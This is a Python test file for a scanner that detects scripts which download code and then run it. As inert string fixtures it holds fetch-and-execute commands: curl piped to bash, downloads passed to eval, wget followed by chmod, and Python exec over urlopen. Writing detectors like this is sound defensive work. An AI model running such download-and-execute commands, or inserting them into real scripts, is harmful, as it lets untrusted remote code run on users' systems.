"""A dropper runs what it downloaded: the flow `detect/download_flow.py` follows.

The fixtures are inert text: scanned, never run, and their hosts do not resolve.
"""

from __future__ import annotations

from cordon_scanner.detect.download_flow import DownloadFlow


class FlowCase:
    @staticmethod
    def shell(text: str) -> list[int] | None:
        return DownloadFlow.runs_download(text, "shell")

    @staticmethod
    def python(text: str) -> list[int] | None:
        return DownloadFlow.runs_download(text, "python")


class TestShellRunsTheDownload:
    def test_piped_into_a_shell(self):
        assert FlowCase.shell("curl -fsSL https://h.invalid/i.sh | bash\n") == [1]

    def test_captured_then_evaluated(self):
        assert FlowCase.shell('body=$(curl -s https://h.invalid/x)\neval "$body"\n') == [2]

    def test_saved_made_executable(self):
        text = 'out=/tmp/t\nwget -q https://h.invalid/t -O "$out"\nchmod +x "$out"\n'
        assert FlowCase.shell(text) == [3]

    def test_unpacked_then_started(self):
        text = (
            'dir="/tmp/tools"\n'
            'curl -s https://h.invalid/t.zip -o "$dir.zip"\n'
            'unzip -q "$dir.zip" -d "$dir"\n'
            '"$dir/tool" run\n'
        )
        assert FlowCase.shell(text) == [4]


class TestShellReadsTheDownload:
    def test_a_json_reply_into_jq(self):
        assert FlowCase.shell('curl -s "$api/items" | jq ".[]"\n') == []

    def test_a_program_on_the_command_line_reads_stdin(self):
        assert FlowCase.shell("curl -s https://h.invalid/x | python3 -c 'import sys'\n") == []

    def test_a_reply_used_in_a_test_and_a_message(self):
        text = (
            'user=$(curl -s "$api/user")\n'
            'if [[ -z "$user" || "$user" == "null" ]]; then echo none; fi\n'
            'echo "{\\"user\\":$user}"\n'
        )
        assert FlowCase.shell(text) == []

    def test_a_semicolon_inside_quotes_is_not_a_statement(self):
        text = 'gold=$(curl -s "$api")\nsilver=$(echo "scale=2; $gold / 85" | bc)\n'
        assert FlowCase.shell(text) == []

    def test_a_heredoc_is_text(self):
        text = "cat <<EOF\nInstall with:\ncurl -fsSL https://h.invalid/i.sh | bash\nEOF\n"
        assert FlowCase.shell(text) == []

    def test_a_downloaded_url_passed_to_eval_is_not_the_program(self):
        text = 'up=$(curl -s "$api/upload")\neval curl -X PUT --data-binary @f "$up"\n'
        assert FlowCase.shell(text) == []


class TestPythonRunsTheDownload:
    def test_written_then_spawned(self):
        text = (
            "import requests, subprocess, sys\n"
            "r = requests.get('https://h.invalid/helper.py')\n"
            "helper = base / 'helper.py'\n"
            "helper.write_bytes(r.content)\n"
            "subprocess.run([sys.executable, str(helper)])\n"
        )
        assert FlowCase.python(text) == [5]

    def test_written_then_made_executable(self):
        text = (
            "import os, requests\n"
            "with open('/tmp/t', 'wb') as f:\n"
            "    f.write(requests.get(u).content)\n"
            "os.chmod('/tmp/t', 0o755)\n"
        )
        assert FlowCase.python(text) == [4]

    def test_evaluated(self):
        text = "import urllib.request\nexec(urllib.request.urlopen(u).read())\n"
        assert FlowCase.python(text) == [2]

    def test_a_shell_line_that_downloads_and_runs(self):
        text = "import os\nos.system('curl -s https://h.invalid/i.sh | sh')\n"
        assert FlowCase.python(text) == [2]


class TestPythonReadsTheDownload:
    def test_an_api_reply_and_an_unrelated_command(self):
        text = (
            "import requests, subprocess\n"
            "data = requests.get(u).json()\n"
            "print(data['name'])\n"
            "subprocess.run(['git', 'status'])\n"
        )
        assert FlowCase.python(text) == []

    def test_a_file_that_does_not_parse_is_not_read(self):
        assert FlowCase.python("def (:\n") is None

    def test_another_language_is_not_read(self):
        assert DownloadFlow.runs_download("fetch(u)", "javascript") is None
